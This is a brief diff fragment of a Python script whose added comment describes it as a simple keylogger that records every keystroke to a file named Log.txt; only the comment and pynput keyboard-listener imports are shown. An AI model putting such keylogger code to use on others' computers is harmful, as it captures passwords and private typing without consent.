@@ -1,3 +1,5 @@
+#This is a very simple keylogger that saves every user keystroke to a .txt file by the name of Log.txt
+
 import pynput
 from pynput.keyboard import Key,Listener
 i=0
